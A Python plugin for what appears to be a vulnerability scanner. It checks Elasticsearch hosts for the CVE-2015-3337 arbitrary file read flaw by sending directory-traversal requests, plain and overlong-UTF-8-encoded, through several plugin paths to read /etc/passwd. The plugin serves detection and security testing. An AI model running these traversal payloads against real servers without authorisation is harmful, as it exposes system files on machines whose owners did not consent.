#!/usr/bin/env python
# -*- coding:utf-8 -*-

class VulnChecker(VulnCheck):
    def __init__(self, ip_and_port_list):
        self._name = 'file_read_cve20153337'
        self.info = "Check the Elasticsearch arbitrary file read vuln CVE-2015-3337"
        self.keyword = ['all', 'elasticsearch', 'file_read', 'web', 'intranet', 'cve_2015_3337', '9200',]
        self.default_ports_list = [9200,]
        VulnCheck.__init__(self, ip_and_port_list)

    def _check(self, ip, port):
        plugin_list = ['test','kopf', 'HQ', 'marvel', 'bigdesk', 'head']
        path_list = ['/../../../../../../../../../../../../../../etc/passwd','/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd']
        for plugin in plugin_list:
            for path in path_list:
                url1 = "http://%s:%d/_plugin/%s%s"%(ip, port, plugin, path) if add_web_path == "" else "http://%s:%d/%s/_plugin/%s%s"%(ip, port, add_web_path, plugin, path)
                url2 = "https://%s:%d/_plugin/%s%s"%(ip, port, plugin, path) if add_web_path == "" else "https://%s:%d/%s/_plugin/%s%s"%(ip, port, add_web_path, plugin, path)
                try:
                    req = Requester(url1)
                    if req.code == 200 and check_200_or_404(url1) and 'root' in str(req.html):
                        result = "exists Elasticsearch arbitrary file read vuln CVE-2015-3337, check url: %s"%(url1)
                        self._output(ip, port, result)
                except RequesterOpenError:
                    try:
                        req = Requester(url2)
                        if req.code == 200 and check_200_or_404(url2) and 'root' in str(req.html):
                            result = "exists Elasticsearch arbitrary file read vuln CVE-2015-3337, check url: %s"%(url2)
                            self._output(ip, port, result)
                    except: pass
                except: pass

globals()['VulnChecker'] = VulnChecker